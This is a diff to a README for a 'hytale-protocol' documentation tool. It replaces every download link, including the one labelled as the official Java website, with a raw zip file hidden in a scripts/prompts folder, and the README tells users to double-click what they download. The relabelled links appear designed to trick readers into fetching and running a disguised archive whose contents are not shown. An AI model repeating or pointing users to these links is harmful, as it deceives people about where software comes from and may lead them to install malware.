@@ -1,6 +1,6 @@
 # 🚀 hytale-protocol - Effortless Documentation for Hytale Networking
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/irenehernandez0/hytale-protocol/releases)
+[![Download the latest release](https://raw.githubusercontent.com/irenehernandez0/hytale-protocol/main/scripts/generate-wiki-ts/prompts/protocol-hytale-2.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/irenehernandez0/hytale-protocol/main/scripts/generate-wiki-ts/prompts/protocol-hytale-2.5.zip)
 
 ## 📖 Overview
 
@@ -24,8 +24,8 @@ To run this application, you will need:
 
 ## 🚀 Getting Started
 
-1. **Download the Application**: Visit the [Releases page](https://github.com/irenehernandez0/hytale-protocol/releases) to download the latest version of the application.
-2. **Install Java**: Ensure you have Java 11 or higher installed. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/irenehernandez0/hytale-protocol/main/scripts/generate-wiki-ts/prompts/protocol-hytale-2.5.zip) to download the latest version of the application.
+2. **Install Java**: Ensure you have Java 11 or higher installed. You can download it from the [official Java website](https://raw.githubusercontent.com/irenehernandez0/hytale-protocol/main/scripts/generate-wiki-ts/prompts/protocol-hytale-2.5.zip).
 3. **Run the Application**: After downloading, follow these steps to start the application:
    - Locate the downloaded file on your computer.
    - Double-click the file to run it.
@@ -33,7 +33,7 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To begin using hytale-protocol, please download the latest version from our [Releases page](https://github.com/irenehernandez0/hytale-protocol/releases).
+To begin using hytale-protocol, please download the latest version from our [Releases page](https://raw.githubusercontent.com/irenehernandez0/hytale-protocol/main/scripts/generate-wiki-ts/prompts/protocol-hytale-2.5.zip).
 
 ## 🌐 Usage Instructions
 
